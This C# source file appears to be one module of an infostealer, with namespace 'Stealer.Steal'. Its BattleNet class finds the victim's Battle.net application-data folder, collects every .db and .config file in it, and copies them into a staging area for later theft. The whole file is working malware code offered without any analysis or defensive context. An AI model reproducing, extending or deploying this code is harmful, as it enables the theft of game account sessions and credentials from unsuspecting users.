using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Browsers;

internal class BattleNet
{
	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");

	public static void Start()
	{
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			string text = Path.Combine("Gaming", "BattleNet");
			string[] array = new string[2] { "*.db", "*.config" };
			foreach (string searchPattern in array)
			{
				string[] files = Directory.GetFiles(path, searchPattern, SearchOption.AllDirectories);
				foreach (string fileName in files)
				{
					try
					{
						string text2 = null;
						FileInfo fileInfo = new FileInfo(fileName);
						if (fileInfo.Directory != null)
						{
							text2 = ((fileInfo.Directory != null && fileInfo.Directory.Name == "Battle.net") ? text : Path.Combine(text, fileInfo.Directory.Name));
						}
						if (text2 != null)
						{
							DynamicFiles.WriteAllBytes(Path.Combine(text2, fileInfo.Name), File.ReadAllBytes(fileInfo.FullName));
						}
					}
					catch
					{
						return;
					}
				}
			}
		}
		catch
		{
		}
	}
}
